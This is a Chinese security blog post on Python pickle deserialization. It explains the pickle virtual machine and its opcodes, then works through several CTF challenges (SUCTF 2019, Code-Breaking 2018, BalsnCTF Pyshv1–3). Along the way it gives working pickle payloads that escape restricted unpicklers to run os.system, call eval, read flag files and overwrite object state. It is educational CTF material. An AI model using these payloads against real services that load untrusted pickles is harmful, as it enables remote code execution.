# Python pickle 反序列化实例分析

阅读量 **947668**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-10-23 11:30:52

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t010fd413cabb90a80d.jpg)

## 前言

之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn
一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。

这个 PPT 一定要好好看看，非常的通俗易懂。 <https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf>

## 序列化与反序列化

> Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）
>
> 用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行
    
    
    # Use the faster _pickle if possible
    try:
        from _pickle import ( ...  # 这里 _pickle => pickle

### 序列化过程

  * 从对象中提取所有属性（__dict__），并将属性转为键值对
  * 写入对象的类名
  * 写入键值对

### 反序列化过程

  * 获取 pickle 输入流
  * 重建属性列表
  * 根据保存的类名创建一个新的对象
  * 将属性复制到新的对象中

## pickle 是什么？

### 简介

pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。

PVM 由三部分组成：

  * 指令处理器 

从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。

最终留在栈顶的值将被作为反序列化对象返回。

  * stack 

由 Python 的 list 实现，被用来临时存储数据、参数以及对象。

  * memo 

由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。

PS：注意下 stack、memo 的实现方式，方便理解下面的指令。

> 当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。
>
>   * v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。
>   * v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。
>   * v2 版协议是在 Python 2.3 中引入的。它为存储 [new-style
> class](https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class)
> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 [PEP
> 307](https://www.python.org/dev/peps/pep-0307)。
>   * v3 版协议添加于 Python 3.0。它具有对 [bytes](https://docs.python.org/zh-> cn/3/library/stdtypes.html#bytes) 对象的显式支持，且无法被 Python 2.x
> 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。
>   * v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4
> 版协议带来改进的信息，请参阅 [PEP 3154](https://www.python.org/dev/peps/pep-3154)。
>

### 指令集

> 本文重点说明 0 号协议，不明白的指令建议直接看对应实现！
    
    
    MARK           = b'('   # push special markobject on stack
    STOP           = b'.'   # every pickle ends with STOP
    POP            = b'0'   # discard topmost stack item
    POP_MARK       = b'1'   # discard stack top through topmost markobject
    DUP            = b'2'   # duplicate top stack item
    FLOAT          = b'F'   # push float object; decimal string argument
    INT            = b'I'   # push integer or bool; decimal string argument
    BININT         = b'J'   # push four-byte signed int
    BININT1        = b'K'   # push 1-byte unsigned int
    LONG           = b'L'   # push long; decimal string argument
    BININT2        = b'M'   # push 2-byte unsigned int
    NONE           = b'N'   # push None
    PERSID         = b'P'   # push persistent object; id is taken from string arg
    BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
    REDUCE         = b'R'   # apply callable to argtuple, both on stack
    STRING         = b'S'   # push string; NL-terminated string argument
    BINSTRING      = b'T'   # push string; counted binary string argument
    SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
    UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
    BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
    APPEND         = b'a'   # append stack top to list below it
    BUILD          = b'b'   # call __setstate__ or __dict__.update()
    GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
    DICT           = b'd'   # build a dict from stack items
    EMPTY_DICT     = b'}'   # push empty dict
    APPENDS        = b'e'   # extend list on stack by topmost stack slice
    GET            = b'g'   # push item from memo on stack; index is string arg
    BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
    INST           = b'i'   # build & push class instance
    LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
    LIST           = b'l'   # build list from topmost stack items
    EMPTY_LIST     = b']'   # push empty list
    OBJ            = b'o'   # build & push class instance
    PUT            = b'p'   # store stack top in memo; index is string arg
    BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
    LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
    SETITEM        = b's'   # add key+value pair to dict
    TUPLE          = b't'   # build tuple from topmost stack items
    EMPTY_TUPLE    = b')'   # push empty tuple
    SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
    BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
    ​
    TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
    FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

## 如何生成 pickle？

### 手写

基本模式：

    
    
    c<module>
    <callable>
    (<args>
    tR

看个小例子：

    
    
    cos
    system
    (S'ls'
    tR.
    ​
    <=> __import__('os').system(*('ls',))
    ​
    # 分解一下：
    cos
    system  =>  引入 system，并将函数添加到 stack
    ​
    (S'ls'  =>  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack
    t       =>  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack
    # 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [<built-in function system>, ('ls',)]
    R       =>  system(*('ls',))
    .       =>  结束，返回当前栈顶元素

### __reduce__

    
    
    import os, pickle
    ​
    class Test(object):
        def __reduce__(self):
            return (os.system,('ls',))
        
    print(pickle.dumps(Test(), protocol=0))
    ​
    '''
    b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'
    '''

缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。

## 实例分析

### SUCTF 2019 Guess_game

> 完整源码：<https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game>

猜数游戏，10 以内的数字，猜对十次就返回 flag。

    
    
    # file: Ticket.py
    class Ticket:
        def __init__(self, number):
            self.number = number
    ​
        def __eq__(self, other):
            if type(self) == type(other) and self.number == other.number:
                return True
            else:
                return False
    ​
        def is_valid(self):
            assert type(self.number) == int
    ​
            if number_range >= self.number >= 0:
                return True
            else:
                return False
           
    # file: game_client.py
    number = input('Input the number you guess\n> ')
    ticket = Ticket(number)
    ticket = pickle.dumps(ticket)
    writer.write(pack_length(len(ticket)))
    writer.write(ticket)

client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。

    
    
    # file: game_server.py 有删减
    from guess_game.Ticket import Ticket
    from guess_game.RestrictedUnpickler import restricted_loads
    from struct import unpack
    from guess_game import game
    import sys
    ​
    while not game.finished():
        ticket = stdin_read(length)
        ticket = restricted_loads(ticket)
    ​
        assert type(ticket) == Ticket
    ​
        if not ticket.is_valid():
            print('The number is invalid.')
            game.next_game(Ticket(-1))
            continue
    ​
        win = game.next_game(ticket)
        if win:
            text = "Congratulations, you get the right number!"
        else:
            text = "Wrong number, better luck next time."
        print(text)
    ​
        if game.is_win():
            text = "Game over! You win all the rounds, here is your flag %s" % flag
        else:
            text = "Game over! You got %d/%d." % (game.win_count, game.round_count)
        print(text)
    ​
    # file: RestrictedUnpickler.py  对引入的模块进行检测
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            # Only allow safe classes
            if "guess_game" == module[0:10] and "__" not in name:
                return getattr(sys.modules[module], name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
    ​
    ​
    def restricted_loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()

server 端将接收到的数据进行反序列，这里与常规的 pickle.loads 不同，采用的是 Python
提供的[安全措施](https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals)。也就是说，导入的模块只能以
guess_name 开头，并且名称里不能含有 __。

最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。

    
    
    # file: Game.py
    from random import randint
    from guess_game.Ticket import Ticket
    from guess_game import max_round, number_range
    ​
    class Game:
        def __init__(self):
            number = randint(0, number_range)
            self.curr_ticket = Ticket(number)
            self.round_count = 0
            self.win_count = 0
    ​
        def next_game(self, ticket):
            win = False
            if self.curr_ticket == ticket:
                self.win_count += 1
                win = True
    ​
            number = randint(0, number_range)
            self.curr_ticket = Ticket(number)
            self.round_count += 1
    ​
            return win
    ​
        def finished(self):
            return self.round_count >= max_round
    ​
        def is_win(self):
            return self.win_count == max_round

只要能控制住 curr_ticket，每局就能稳赢，或者直接将 win_count 设为 10，能实现吗？

先试试覆盖 win_count 和 round_count。换句话来说，就是需要在反序列化 Ticket 对象前执行：

    
    
    from guess_game import game  # __init__.py  game = Game()
    game.round_count = 10
    game.win_count = 10

pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。

    
    
    BUILD = b'b'   # call __setstate__ or __dict__.update()
    # 具体实现在 pickle.py 的 1546 行

开始构造

    
    
    cguess_game
    game
    }S'round_count'
    I10
    sS'win_count'
    I10
    sb

其中，} 是往 stack 中压入一个空 dict，s 是将键值对插入到 dict。

测试一下效果，成功。

![](https://p2.ssl.qhimg.com/t0168786187ad5d1b6d.jpg)

到这就做完了吗？不，还有个小验证，assert type(ticket) == Ticket。

之前提到过，pickle 序列流执行完后将把栈顶的值返回，那结尾再留一个 Ticket 的对象就好了。

    
    
    ticket = Ticket(6)
    res = pickle.dumps(ticket)  # 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor
    print(res)
    '''
    \x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
    '''

最终 payload：

    
    
    cguess_game\ngame\n}S"win_count"\nI10\nsS"round_count"\nI9\nsbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.

尝试覆盖掉 current_ticket：

    
    
    cguess_game\n
    game
    }S'curr_ticket'
    cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbp0
    sbg0
    .

这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。

最终 payload：

    
    
    cguess_game\ngame\n}S'curr_ticket'\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x07sbp0\nsbg0\n.

### Code-Breaking 2018 picklecode

> 完整源码： <https://github.com/phith0n/code-breaking/blob/master/2018/picklecode>
    
    
    import pickle
    import io
    import builtins
    
    __all__ = ('PickleSerializer', )
    
    
    class RestrictedUnpickler(pickle.Unpickler):
        blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
    
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name not in self.blacklist:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    
    
    class PickleSerializer():
        def dumps(self, obj):
            return pickle.dumps(obj)
    
        def loads(self, data):
            try:
                if isinstance(data, str):
                    raise TypeError("Can't load pickle from unicode string")
                file = io.BytesIO(data)
                return RestrictedUnpickler(file,
                                  encoding='ASCII', errors='strict').load()
            except Exception as e:
                return {}

这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：

    
    
    >>> getattr(globals()['__builtins__'], 'eval')
    <built-in function eval>
    
    <=>
    
    >>> getattr(dict.get(globals(), '__builtins__'), 'eval')
    <built-in function eval>

getattr 和 globals 并没有被禁，那就尝试写 pickle 吧。

    
    
    cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tRp100
    (cbuiltins
    globals
    (tRS'__builtins__'
    tRp101
    0g100
    (g101
    S'eval'
    tR(S'__import__("os").system("dir")'
    tR.

PS：我的环境是 Python 3.7.4，反序列化时获取到的 builtins 是一个 dict，所以用了两次 get，视环境进行调整吧。这个
payload 在 Python 3.7.3 又跑不起来 ：）

### BalsnCTF 2019 Pyshv1

> 环境：
> <https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1>
    
    
    # File: securePickle.py
    import pickle, io
    
    whitelist = []
    
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            return pickle.Unpickler.find_class(self, module, name)
    
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    
    dumps = pickle.dumps
    
    
    # File: server.py
    import securePickle as pickle
    import codecs
    
    pickle.whitelist.append('sys')
    
    class Pysh(object):
        def __init__(self):
            self.login()
            self.cmds = {}
    
        def login(self):
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            raise NotImplementedError("Not Implemented QAQ")
    
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
    
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()

限制了导入的模块只能是 sys，问题是这个模块也不安全呀 ：）

> sys.modules
>
> This is a dictionary that maps module names to modules which have already
> been loaded. This can be manipulated to force reloading of modules and other
> tricks. However, replacing the dictionary will not necessarily work as
> expected and deleting essential items from the dictionary may cause Python
> to fail.

如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 os，但是不能直接使用，原因在于
sys.modules 中未经 import 加载的模块对当前空间是不可见的。

这里的 find_class 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：

    
    
    # pickle.Unpickler.find_class
    def find_class(self, module, name):
        # Subclasses may override this.
        if self.proto < 3 and self.fix_imports:
            if (module, name) in _compat_pickle.NAME_MAPPING:
                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
            elif module in _compat_pickle.IMPORT_MAPPING:
                module = _compat_pickle.IMPORT_MAPPING[module]
        __import__(module, level=0)
        if self.proto >= 4:
            return _getattribute(sys.modules[module], name)[0]
        else:
            return getattr(sys.modules[module], name)

其中 sys.modules 为：

    
    
    {	
        'sys': < module 'sys'(built - in ) > ,
        'builtins': < module 'builtins'(built - in ) > ,
        'os': < module 'os'
        from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' > ,
    }

那我们的目标：

    
    
    cos\nsystem  <=> getattr(sys.modules['os'], 'system')

限制了 module 只能为 sys，那能否把 sys.modules[‘sys’]替换为sys.modules[‘os’]，从而引入危险模块。

    
    
    from sys import modules
    modules['sys'] = modules['os']
    from sys import system

本地实验一下，成功：

    
    
    PS C:\Users\wywwzjj> python
    Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)] on win32
    Type "help", "copyright", "credits" or "license" for more information.
    >>> from sys import modules
    >>> modules['sys'] = modules['os']
    >>> from sys import system
    >>> system('dir')
     驱动器 C 中的卷没有标签。
     卷的序列号是 F497-F727
    
     C:\Users\wywwzjj 的目录
    
    2019/10/15  20:36    <DIR>          .
    2019/10/15  20:36    <DIR>          ..
    2019/08/22  21:02             2,750 .aggressor.prop
    2019/09/16  00:09    <DIR>          .anaconda
    2019/04/09  13:58    <DIR>          .android
    2018/12/13  14:37    <DIR>          .astropy
    2019/10/15  20:36            18,465 .bash_history
    2019/04/07  12:03    <DIR>          .CLion2019.1

还有个小麻烦，modules 是个 dict，无法直接取值。继续利用 getattr(sys.modules[module], name)。

    
    
    >>> import sys
    >>> sys.modules['sys'] = sys.modules
    >>> import sys
    >>> dir(sys)  # 成功导入 dict 对象
    ['__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']
    >>> getattr(sys, 'get')  # 结合 find_class 中的 getattr
    <built-in method get of dict object at 0x000002622D052688>

改写成 pickle：

    
    
    csys
    modules
    p100
    S'sys'
    g100
    scsys
    get
    (S'os'
    tRp101
    0S'sys'
    g101
    scsys
    system
    (S'dir'
    tR.

### BalsnCTF 2019 Pyshv2

> 环境：
> <https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2>
    
    
    # File: securePickle.py
    import pickle
    import io
    
    
    whitelist = []
    
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
    
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            module = __import__(module)
            return getattr(module, name)
    
    
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    
    
    dumps = pickle.dumps
    
    
    
    # File: server.py
    import securePickle as pickle
    import codecs
    
    
    pickle.whitelist.append('structs')
    
    
    class Pysh(object):
        def __init__(self):
            self.login()
            self.cmds = {
                'help': self.cmd_help,
                'flag': self.cmd_flag,
            }
    
        def login(self):
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            raise NotImplementedError("Not Implemented QAQ")
    
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
    
        def cmd_help(self):
            print('Available commands: ' + ' '.join(self.cmds.keys()))
    
        def cmd_su(self):
            print("Not Implemented QAQ")
            # self.user.privileged = 1
    
        def cmd_flag(self):
            print("Not Implemented QAQ")
    
    
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
    
        
    # File: structs.py 为空

真会玩，给你一个空模块：），先看下空模块有哪些内置方法：

    
    
    >>> structs = __import__('structs')
    >>> structs
    <module 'structs' from 'C:\\Users\\wywwzjj\\structs.py'>
    >>> dir(structs)
    ['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']
    >>> getattr(structs, '__builtins__')['eval']
    <built-in function eval>

好了，问题又转变为如何获取键值，还是比较艰难。

查文档时又发现了一个东西，原来 __import__ 可被覆盖。

> __import__(name, globals=None, locals=None, fromlist=(), level=0)
>
> 此函数会由 [import](https://docs.python.org/zh-> cn/3/reference/simple_stmts.html#import) 语句发起调用。 它可以被替换 (通过导入
> [builtins](https://docs.python.org/zh-cn/3/library/builtins.html#module-> builtins) 模块并赋值给 builtins.__import__) 以便修改 import 语句的语义，但是 强烈
> 不建议这样做，因为使用导入钩子 (参见 [PEP 302](https://www.python.org/dev/peps/pep-0302))
> 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用
> [__import__()](https://docs.python.org/zh-> cn/3/library/functions.html#__import__) 而应该用
> [importlib.import_module()](https://docs.python.org/zh-> cn/3/library/importlib.html#importlib.import_module)。

那该覆盖成什么函数呢？最好是 __import__(module) 后能返回字典的函数。

只能从内置函数下手了，一个一个试吧，发现没一个能用的。

后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。

<https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html>

![](https://p3.ssl.qhimg.com/t01a7a5f8b2d1318c46.jpg)

这个 __getattribute__ 恰好能符合我们的要求，真棒。

    
    
    >>> getattr(structs, '__getattribute__')('__builtins__')
    {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>),...

再理下思路：（伪代码）

    
    
    d = getattr(structs, '__builtins__')  	 # 获取到字典，先存起来
    getattr(structs, '__import__') = getattr(structs, '__getattribute__')  # 覆盖 __import__
    setattr(structs, 'structs', d)  		 # 创建个 structs 的属性，字典写入该属性
    mo = __import__(structs)				 # 此时的 mo 就是我们之前的 __builtins__
    getattr(mo, 'get')  			 	 	 # 获取到 get 方法，然后就可以按照 pyshv1 的思路来了

转换为 pickle：

    
    
    cstructs
    __getattribute__
    p100
    0cstructs
    __dict__
    S'structs'
    cstructs
    __builtins__						# 先添加 structs 属性
    p101
    sg101
    S'__import__'
    g100
    scstructs
    get
    (S'eval'
    tR(S'print(open("../flag").read())'   # 这里已经不能 __import__('os') 了，能继续执行命令吗：）
    tR.

### BalsnCTF 2019 Pyshv3

> 环境：
> <https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3>
    
    
    # File: securePickle.py
    import pickle
    import io
    
    
    whitelist = []
    
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
    
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            return pickle.Unpickler.find_class(self, module, name)
    
    
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    
    
    dumps = pickle.dumps
    
    
    
    # File: server.py
    import securePickle as pickle
    import codecs
    import os
    
    
    pickle.whitelist.append('structs')
    
    
    class Pysh(object):
        def __init__(self):
            self.key = os.urandom(100)
            self.login()
            self.cmds = {
                'help': self.cmd_help,
                'whoami': self.cmd_whoami,
                'su': self.cmd_su,
                'flag': self.cmd_flag,
            }
    
        def login(self):
            with open('../flag.txt', 'rb') as f:
                flag = f.read()
            flag = bytes(a ^ b for a, b in zip(self.key, flag))
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            print('Login as ' + user.name + ' - ' + user.group)
            user.privileged = False
            user.flag = flag
            self.user = user
    
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
    
        def cmd_help(self):
            print('Available commands: ' + ' '.join(self.cmds.keys()))
    
        def cmd_whoami(self):
            print(self.user.name, self.user.group)
    
        def cmd_su(self):
            print("Not Implemented QAQ")
            # self.user.privileged = 1
    
        def cmd_flag(self):
            if not self.user.privileged:
                print('flag: Permission denied')
            else:
                print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))
    
    
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
    
        
    # File: structs.py
    class User(object):
        def __init__(self, name, group):
            self.name = name
            self.group = group
            self.isadmin = 0
            self.prompt = ''

RestrictedUnpickler 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。

注意到，在 cmd_flag() 中，self.user.privileged 只要就符合条件将输出 flag。

    
    
    user = pickle.loads(user)
    user.privileged = False  # 这个有点猛，后面还有赋值，没法直接覆盖了

魔术方法列表中可以看到，给属性赋值时，用的是 __setattr__(self, name)，能不能把这个干掉？

看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 privileged ，同时又不干扰 flag？

继续在魔术方法里寻找，突然看到了一个创建描述符对象里有 __set__ 方法，会不会有点关系呢。

![](https://p3.ssl.qhimg.com/t010199e6e302570fb8.jpg)

> 属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，a.x 的查找顺序会从 a.__dict__[‘x’] 开始，然后是
> type(a).__dict__[‘x’]，接下来依次查找 type(a) 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则
> Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。

关于描述符的讲解还可以看下这文章：<https://foofish.net/what-is-descriptor-in-python.html>

    
    
    class RevealAccess(object):
        """A data descriptor that sets and returns values
           normally and prints a message logging their access.
        """
    
        def __init__(self, initval=None, name='var'):
            self.val = initval
            self.name = name
    
        def __get__(self, obj, objtype):
            print('Retrieving', self.name)
            return self.val
    
        def __set__(self, obj, val):
            print('Updating', self.name)
            self.val = val
    
    >>> class MyClass(object):
    ...     x = RevealAccess(10, 'var "x"')
    ...     y = 5
    ...
    >>> m = MyClass()
    >>> m.x
    Retrieving var "x"
    10
    >>> m.x = 20
    Updating var "x"
    >>> m.x
    Retrieving var "x"
    20
    >>> m.y
    5

可清楚的看到，对属性 x 的操作都被 “hook” 住了，而 y 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的
RevealAccess，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。

    
    
    class MyClass(object):
        def __set__(self, obj, val):
            pass
        
        y = 5
        
    m = MyClass()
    MyClass.x = m
    print(m.x)
    m.y = 6
    print(m.y)
    m.x = 3
    print(m.x)
    
    '''
    <__main__.MyClass object at 0x000001CBA8A93C48>
    6
    <__main__.MyClass object at 0x000001CBA8A93C48>
    '''

把这个过程转为 pickle：

    
    
    cstructs
    User
    p100
    (I111
    I222
    tRp101
    g100
    (N}S'__set__'
    g100
    sS'privileged'
    g101
    stbg101
    .

看一下结果：

![](https://p3.ssl.qhimg.com/dm/1024_656_/t01fe621874c16e4543.jpg)

## 参考链接

<https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf>

<http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>

[https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python
反序列化漏洞/](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

<https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wywwzjj** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/188981](/post/id/188981)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __15赞

 __收藏

![](https://p5.ssl.qhimg.com/t0164e1b26ed647594d.png) wywwzjj

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

